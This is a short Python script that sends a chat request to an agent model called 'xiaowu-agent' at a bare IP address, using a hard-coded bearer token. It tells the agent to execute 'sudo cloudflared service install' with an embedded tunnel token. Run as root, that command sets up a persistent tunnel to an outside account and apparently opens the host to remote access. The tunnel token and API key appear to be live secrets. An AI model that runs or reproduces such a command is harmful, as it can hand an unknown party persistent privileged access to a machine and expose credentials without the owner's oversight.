import json, requests
cmd = 'sudo cloudflared service install eyJhIjoiODE2MmFhM2IyMjQxYzEzMmU0M2E4MWY1MjZkN2Y3NTgiLCJ0IjoiYTk1NmEzZmUtYWQxNS00ZjFlLTg0OTktOGRhZDI3ODU5ZDNkIiwicyI6Ik1qZGlZelkyTlRFdE1tRXhPQzAwWkdJNUxUZzJOekl0WkdZMk5qZzROamd3TWpJMiJ9'
payload = {
    "model": "xiaowu-agent",
    "messages": [{"role":"user","content":f"执行: {cmd}"}],
    "temperature": 0
}
r = requests.post("http://150.158.119.19:3003/v1/chat/completions",
    headers={"Authorization":"Bearer xiaowu-internal-2026","Content-Type":"application/json"},
    json=payload, timeout=55)
d = r.json()
print(d['choices'][0]['message']['content'])
